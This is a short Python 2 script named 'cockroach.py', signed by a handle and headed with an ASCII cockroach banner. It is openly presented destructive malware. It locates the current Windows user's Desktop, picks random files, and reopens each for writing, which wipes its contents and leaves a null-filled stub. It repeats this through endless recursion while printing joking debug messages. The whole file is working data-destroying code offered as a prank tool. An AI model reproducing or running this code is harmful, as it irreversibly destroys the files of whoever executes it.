#!/c/Python27/python.exe
#cockroach.py - nom nom nom files sure are tasty
#0xicl33n
#
import os
from os import system
import random
import time
from random import randint
from time import sleep
from binascii import unhexlify
import dircache
import os
import shutil

thisBanner = '''
      ,--.     .--. 
      /    \. ./    \ 
     /  /\ / " \ /\  \ 
    / _/  {~~v~~}  \_ \ 
   /     {   |   }     \ 
  ;   /\{    |    }/\   \ 
  | _/  {    |    }  \_  : 
  |     {    |    }      | 
  |    /{    |    }\     | 
  |   / {    |    } \    | 
  |  /  {    |    }  \   | 
  |  \  \    |    /  /   | 
  |   \  \   |   /  /    | 
  \    \  \  |  /  /     / 
   \   /   ~~~~~   \    / 
   COCKROACHES BY 0XICL33N
'''
random.seed()
ourUser=os.getenv('username')
#ourUid=os.getuid
ourDesktop = "C:\\Users\\" + ourUser + "\\Desktop"

def getRandomfile():
	dircache.reset()
	thisFile = ourDesktop  + "\\" + random.choice(dircache.listdir(ourDesktop))
	return thisFile

def munch(file):
	chewThis = random.randint(1,1337) * 10
	print "[@]DEBUG: IMMA MUNCH THIS:",file 
	print "[@]DEBUG: IMMA EAT",chewThis,'BYTES'
	with open(file, 'w+') as fdest:
        	fdest.seek(chewThis, os.SEEK_END)
        	fdest.truncate(chewThis)
        	print "[@]DEBUG: NOM NOM TASTY FILES"


def getTime():
	thisTime = randint(60,600) # 1 minute through 10 minute
	return thisTime

def runThiscrap():
	datFile = getRandomfile()	
	munch(datFile)

def main():
	#print "[@]DEBUG: IMMA SLEEP FOR",thisTime, 'SECONDS'
	#sleep(thisTime)
	datFile = getRandomfile()
	if "ini" in datFile:
		datFile = getRandomfile()
		munch(datFile)
		main()
	else:
		munch(datFile)
		main()
main()